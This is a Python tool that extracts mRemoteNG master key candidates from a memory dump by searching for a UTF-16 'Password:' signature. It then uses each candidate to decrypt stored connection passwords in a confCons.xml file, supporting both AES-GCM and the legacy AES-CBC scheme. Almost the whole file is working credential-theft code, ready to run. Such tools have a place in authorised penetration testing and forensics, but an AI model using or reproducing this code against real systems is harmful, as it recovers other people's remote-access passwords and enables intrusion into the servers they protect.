"""!
@brief Extract mRemoteNG vault master key candidates from a memory dump and
decrypt stored credentials.

Combines the signature-based master key extraction from extract_master_key.py
with the mRemoteNG decryption logic from mremoteng_decrypt.py. For each master
key candidate found in the dump, the script attempts to decrypt the first
encrypted password entry in the provided mRemoteNG configuration file
(confCons.xml). Stops on the first successful decryption.

Supports both the current AES-GCM decryption method (PBKDF2-SHA1, 1000
iterations, 32-byte key) and the legacy AES-CBC method (MD5-derived key)
used in mRemoteNG <= 1.74.

@see https://github.com/kmahyyg/mremoteng-decrypt
"""

import sys
import hashlib
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import xml.etree.ElementTree as ET
import argparse


def mremoteng_decrypt_legacy(encrypted_data, password_key, silent=True):
    """! Decrypt an mRemoteNG password blob using the legacy AES-CBC method.

    Used by mRemoteNG versions <= 1.74. Derives a 16-byte key from the
    master password via MD5, then decrypts with AES-CBC using the first
    16 bytes of the blob as the IV.

    @param encrypted_data  str: Base64-encoded encrypted password from confCons.xml.
    @param password_key    str: The master key (vault password) to decrypt with.
    @param silent          bool: If False, print error details on failure.
    @return                bytes: Decrypted plaintext, or empty bytes on failure.
    """
    try:
        encrypted_data = encrypted_data.strip()
        encrypted_data_bytes = base64.b64decode(encrypted_data)
        initial_vector = encrypted_data_bytes[:16]
        ciphertext = encrypted_data_bytes[16:]
        key = hashlib.md5(password_key.encode('utf-8')).digest()

        cipher = AES.new(key, AES.MODE_CBC, initial_vector)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext
    except Exception as e:
        if not silent:
            print(f"[!] Legacy mRemoteNG decryption failed: {e}")
        return b''


def mremoteng_decrypt(encrypted_data, password_key, silent=True):
    """! Decrypt an mRemoteNG password blob using the current AES-GCM method.

    Used by mRemoteNG versions > 1.74. Derives a 32-byte key from the master
    password via PBKDF2-HMAC-SHA1 with 1000 iterations, using the first 16
    bytes of the blob as both salt and associated data. Bytes 16-32 are the
    GCM nonce, the last 16 bytes are the authentication tag, and everything
    in between is the ciphertext.

    @param encrypted_data  str: Base64-encoded encrypted password from confCons.xml.
    @param password_key    str: The master key (vault password) to decrypt with.
    @param silent          bool: If False, print error details on failure.
    @return                bytes: Decrypted plaintext, or empty bytes on failure.
    """
    try:
        encrypted_data = encrypted_data.strip()
        encrypted_data_bytes = base64.b64decode(encrypted_data)
        salt = encrypted_data_bytes[:16]
        associated_data = encrypted_data_bytes[:16]
        nonce = encrypted_data_bytes[16:32]
        ciphertext = encrypted_data_bytes[32:-16]
        tag = encrypted_data_bytes[-16:]

        key = hashlib.pbkdf2_hmac(
            "sha1", password_key.encode('utf-8'), salt, 1000, dklen=32)

        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        cipher.update(associated_data)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except Exception as e:
        if not silent:
            pass
        return b''


## UTF-16 LE byte sequence for "Password:" (17 bytes).
KNOWN_SIGNATURE = b'\x50\x00\x61\x00\x73\x00\x73\x00\x77\x00\x6F\x00\x72\x00\x64\x00\x3A'

## .NET x86 string object overhead between the signature and the master key.
OFFSET_AFTER_SIGNATURE = 15

## UTF-16 LE null terminator.
UTF16_LE_NULL_TERMINATOR = b'\x00\x00'


def find_and_test_passwords(dump_file_path, mremoteng_config_path, use_legacy_decrypt):
    """! Scan a memory dump for master key candidates and try to decrypt vault entries.

    Reads the memory dump and the mRemoteNG XML configuration file. Extracts
    the first encrypted password from the config, then scans the dump for
    "Password:" signature hits. For each candidate string found after the
    signature, attempts decryption. Stops on the first successful match.

    @param dump_file_path        str: Path to the memory dump file.
    @param mremoteng_config_path str: Path to the mRemoteNG confCons.xml file.
    @param use_legacy_decrypt    bool: Use AES-CBC (legacy) instead of AES-GCM.
    """
    try:
        with open(dump_file_path, 'rb') as f:
            memory_dump = f.read()
    except FileNotFoundError:
        print(f"[!] Error: Memory dump file not found at {dump_file_path}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An error occurred while reading the memory dump file: {e}")
        sys.exit(1)

    target_mremoteng_encrypted_string = None
    try:
        tree = ET.parse(mremoteng_config_path)
        root = tree.getroot()
        for node in root.iter('Node'):
            if 'Password' in node.attrib and node.attrib['Password']:
                target_mremoteng_encrypted_string = node.attrib['Password']
                print(f"[~] Using first encrypted password found in mRemoteNG config: '{target_mremoteng_encrypted_string[:30]}...'")
                break
    except FileNotFoundError:
        print(f"[!] Error: mRemoteNG config file not found at {mremoteng_config_path}")
        sys.exit(1)
    except ET.ParseError:
        print(f"[!] Error: Could not parse mRemoteNG XML file: {mremoteng_config_path}")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An error occurred while reading/parsing the mRemoteNG config file: {e}")
        sys.exit(1)

    if not target_mremoteng_encrypted_string:
        print(f"[!] No encrypted passwords found in mRemoteNG config file: {mremoteng_config_path}")
        sys.exit(1)

    mrem_decrypt_function = mremoteng_decrypt_legacy if use_legacy_decrypt else mremoteng_decrypt
    if use_legacy_decrypt:
        print(f"[~] Using LEGACY mRemoteNG decryption method.")
    else:
        print(f"[~] Using STANDARD mRemoteNG decryption method.")

    signature_len = len(KNOWN_SIGNATURE)

    signature_hit_count = 0
    memory_candidates_tested = 0
    mremoteng_decrypted_count = 0
    current_pos = 0

    mremoteng_header_printed = False

    print(f"[~] Scanning memory dump '{dump_file_path}' for password candidates...")
    while True:
        index = memory_dump.find(KNOWN_SIGNATURE, current_pos)
        if index == -1:
            break

        signature_hit_count += 1
        password_start_offset = index + signature_len + OFFSET_AFTER_SIGNATURE

        extracted_bytes = b''
        source_info = ""

        if password_start_offset >= len(memory_dump):
            current_pos = index + signature_len
            continue

        search_for_null_from = password_start_offset
        aligned_null_terminator_index = -1

        while search_for_null_from < len(memory_dump) - 1:
            temp_null_idx = memory_dump.find(UTF16_LE_NULL_TERMINATOR, search_for_null_from)
            if temp_null_idx == -1:
                break
            if (temp_null_idx - password_start_offset) % 2 == 0:
                aligned_null_terminator_index = temp_null_idx
                break
            else:
                search_for_null_from = temp_null_idx + 1

        if aligned_null_terminator_index != -1:
            extracted_bytes = memory_dump[password_start_offset:aligned_null_terminator_index]
            source_info = f"offset {hex(password_start_offset)} to {hex(aligned_null_terminator_index)}"
        else:
            segment_to_eof = memory_dump[password_start_offset:]
            if len(segment_to_eof) > 0 and len(segment_to_eof) % 2 == 0:
                extracted_bytes = segment_to_eof
                source_info = f"offset {hex(password_start_offset)} to EOF, len {len(extracted_bytes)}"

        if extracted_bytes:
            if extracted_bytes[0] == 0x00:
                pass
            else:
                try:
                    mem_candidate_password = extracted_bytes.decode('utf-16-le', errors='strict')
                    if mem_candidate_password.isprintable():
                        print(f"[*] Found master key candidate: {mem_candidate_password}")
                        memory_candidates_tested += 1

                        decrypted_mrem_bytes = mrem_decrypt_function(
                            target_mremoteng_encrypted_string,
                            mem_candidate_password,
                            silent=True
                        )

                        if decrypted_mrem_bytes:
                            if not mremoteng_header_printed:
                                print()
                                print(f"[~] mRemoteNG Decryption Successes")
                                mremoteng_header_printed = True

                            try:
                                final_decrypted_mrem_string = decrypted_mrem_bytes.decode('utf-8')
                                print(f"[~] SUCCESS: Memory candidate '{mem_candidate_password}' (from {source_info}) decrypted the mRemoteNG entry.")
                                print(f"[~] Decrypted mRemoteNG Password: '{final_decrypted_mrem_string}'")
                                mremoteng_decrypted_count += 1
                                break
                            except UnicodeDecodeError:
                                print(f"[!] SUCCESS (decode issue): Memory candidate '{mem_candidate_password}' (from {source_info}) decrypted mRemoteNG entry, but result not valid UTF-8.")
                                print(f"[!] Raw decrypted mRemoteNG bytes: {decrypted_mrem_bytes}")
                                mremoteng_decrypted_count += 1
                except UnicodeDecodeError:
                    pass

        current_pos = index + signature_len

    print()
    if mremoteng_decrypted_count > 0:
        print(f"[~] Successfully decrypted the mRemoteNG entry {mremoteng_decrypted_count} time(s) using passwords found in memory.")
    else:
        print(f"[~] No password candidates from memory successfully decrypted the target mRemoteNG entry.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Scan memory dump for potential passwords and test them against an mRemoteNG encrypted entry.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("dump_file",
                        help="Path to the memory dump file.")
    parser.add_argument("config_file",
                        help="Path to the mRemoteNG XML configuration file (e.g., confCons.xml).")
    parser.add_argument("--legacy",
                        action="store_true",
                        help="Use mRemoteNG legacy decryption method (for mRemoteNG version <= 1.74).")

    args = parser.parse_args()

    find_and_test_passwords(args.dump_file, args.config_file, args.legacy)
